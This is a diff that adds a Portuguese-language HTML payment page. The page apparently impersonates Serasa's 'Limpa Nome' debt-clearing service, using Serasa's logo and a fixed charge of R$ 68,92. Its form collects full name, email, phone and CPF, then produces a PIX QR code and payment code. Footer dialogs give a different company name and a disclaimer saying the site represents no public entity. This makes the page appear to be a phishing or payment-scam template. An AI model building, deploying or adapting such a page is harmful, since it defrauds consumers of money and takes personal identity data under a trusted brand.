@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Central • Pagamentos</title>
+  <meta name="description" content="Pagamento seguro via PIX">
+  <link rel="stylesheet" href="/public/css/style.css">
+</head>
+<body>
+  <header class="topbar">
+    <div class="nav">
+      <a href="/" class="brand">
+        <img src="https://logodownload.org/wp-content/uploads/2017/09/serasa-logo-1.png" alt="Ir para página inicial" title="Ir para página inicial" class="brand-logo">
+      </a>
+    </div>
+  </header>
+
+  <main class="hero">
+    <div class="shell">
+      <div class="page-header">
+        <h1>Pagamento Seguro</h1>
+        <p>Realize seu pagamento de forma rápida e segura via PIX.</p>
+      </div>
+
+      <!-- Formulário de Pagamento (Oculto) -->
+      <section class="card" id="payment-form-section" style="display: none;" aria-label="Formulário de Pagamento">
+        <div class="card-head">
+          <div class="card-title">Dados do Pagamento</div>
+        </div>
+        <div class="card-body">
+          <form id="payment-form" class="payment-form">
+            <div class="form-group">
+              <label for="amount">Valor (R$)</label>
+              <input type="number" id="amount" name="amount" step="0.01" min="0.01" required placeholder="0.00">
+            </div>
+
+            <div class="form-group">
+              <label for="item-title">Descrição do Produto/Serviço</label>
+              <input type="text" id="item-title" name="item-title" required placeholder="Ex: Consulta de CPF">
+            </div>
+
+            <div class="form-group">
+              <label for="customer-name">Nome Completo</label>
+              <input type="text" id="customer-name" name="customer-name" required placeholder="Seu nome completo">
+            </div>
+
+            <div class="form-group">
+              <label for="customer-email">E-mail</label>
+              <input type="email" id="customer-email" name="customer-email" required placeholder="seu@email.com">
+            </div>
+
+            <div class="form-group">
+              <label for="customer-phone">Telefone (apenas números)</label>
+              <input type="tel" id="customer-phone" name="customer-phone" required placeholder="11999999999" pattern="[0-9]{10,11}">
+            </div>
+
+            <div class="form-group">
+              <label for="customer-document">CPF (apenas números)</label>
+              <input type="text" id="customer-document" name="customer-document" required placeholder="12345678901" pattern="[0-9]{11}" maxlength="11">
+            </div>
+
+
+            <button type="submit" class="btn-payment" id="btn-submit">
+              <span class="btn-text">Gerar QR Code PIX</span>
+              <span class="btn-loader" style="display: none;">Processando...</span>
+            </button>
+          </form>
+        </div>
+      </section>
+
+      <!-- Área de QR Code -->
+      <section class="card" id="qrcode-section" style="display: none;" aria-label="QR Code PIX">
+        <div class="card-head">
+          <div class="card-title">Pagamento via PIX</div>
+        </div>
+        <div class="card-body">
+          <div class="payment-info">
+            <!-- Resumo do Pagamento -->
+            <div class="payment-summary">
+              <div class="summary-item">
+                <span class="summary-label">Serviço:</span>
+                <span class="summary-value" id="service-name">Serasa Limpa Nome</span>
+              </div>
+              <div class="summary-item">
+                <span class="summary-label">Valor a pagar:</span>
+                <span class="summary-value summary-amount" id="payment-amount">R$ 68,92</span>
+              </div>
+            </div>
+
+            <div class="payment-details">
+              <div class="detail-item">
+                <span class="detail-label">ID da Transação:</span>
+                <span class="detail-value" id="transaction-id">-</span>
+              </div>
+              <div class="detail-item">
+                <span class="detail-label">Expira em:</span>
+                <span class="detail-value" id="expires-at">-</span>
+              </div>
+            </div>
+
+            <div class="qrcode-container">
+              <div class="qrcode-wrapper">
+                <img id="qrcode-image" src="" alt="QR Code PIX" style="display: none;">
+                <div id="qrcode-loading" class="qrcode-loading">
+                  <div class="loading-spinner"></div>
+                  <p class="loading-text">Gerando QR Code PIX...</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="copy-paste-section">
+              <label for="pix-code">Código PIX (Copiar e Colar):</label>
+              <div class="copy-input-group">
+                <input type="text" id="pix-code" readonly class="copy-input">
+                <button type="button" id="btn-copy" class="btn-copy">Copiar</button>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+      <!-- Instruções de Pagamento PIX -->
+      <section class="card" id="payment-instructions" aria-label="Instruções de Pagamento">
+        <div class="card-head">
+          <div class="card-title">Como pagar com PIX</div>
+        </div>
+        <div class="card-body">
+          <div class="pix-instructions">
+            <div class="instruction-step">
+              <div class="step-number" data-step="1">1</div>
+              <p class="step-text">Abra o app do seu banco</p>
+            </div>
+            <div class="instruction-step">
+              <div class="step-number" data-step="2">2</div>
+              <p class="step-text">Escolha a opção PIX</p>
+            </div>
+            <div class="instruction-step">
+              <div class="step-number" data-step="3">3</div>
+              <p class="step-text">Escaneie o QR Code ou cole o código</p>
+            </div>
+            <div class="instruction-step">
+              <div class="step-number" data-step="4">4</div>
+              <p class="step-text">Confirme as informações e valor</p>
+            </div>
+            <div class="instruction-step">
+              <div class="step-number" data-step="5">5</div>
+              <p class="step-text">Conclua o pagamento</p>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer>
+    <div class="foot">
+      <div class="foot-main">
+        <div class="foot-brand-section">
+          <img src="https://logodownload.org/wp-content/uploads/2017/09/serasa-logo-1.png" alt="Serasa" class="foot-logo">
+        </div>
+        <div class="foot-links-section">
+          <a href="#" id="btn-priv">Política de Privacidade</a>
+          <a href="#" id="btn-termos">Termos de Uso</a>
+          <a href="#" id="btn-mais">Saiba Mais</a>
+        </div>
+      </div>
+      <div class="foot-bottom">
+        <p>© <span id="y">2025</span> Central — Todos os direitos reservados.</p>
+        <p class="foot-registry">CNPJ: 62.173.620/0001-80</p>
+      </div>
+    </div>
+  </footer>
+
+  <dialog id="dlg-priv">
+    <div class="modal-head">
+      <div>Política de Privacidade</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-priv').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Coletamos e tratamos dados pessoais exclusivamente para prestar o atendimento solicitado. As informações são utilizadas apenas para identificar seu atendimento e responder suas solicitações.</p>
+      <p>Você pode solicitar a exclusão dos seus dados a qualquer momento através dos nossos canais de atendimento.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d1">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <dialog id="dlg-termos">
+    <div class="modal-head">
+      <div>Termos de Uso</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-termos').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Ao utilizar este site, você concorda em seguir estes Termos de Uso. O conteúdo tem caráter informativo e não substitui orientações de órgãos oficiais.</p>
+      <p>Os serviços oferecidos são de suporte e orientação. Não representamos entidades públicas nem intermediamos decisões governamentais.</p>
+      <p>É proibida a utilização para fins ilícitos, envio de spam ou tentativa de fraude.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d2">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <dialog id="dlg-mais">
+    <div class="modal-head">
+      <div>Mais Informações</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-mais').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Esta plataforma oferece atendimento online seguro e simplificado. Para dúvidas ou suporte, entre em contato através dos nossos canais oficiais.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d3">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <script src="/public/js/main.js"></script>
+  <script src="/public/js/payment.js"></script>
+  <script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl509583'},{'dcenter':'p3'},{'cp_id':'10740190'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script>
+</body>
+</html>
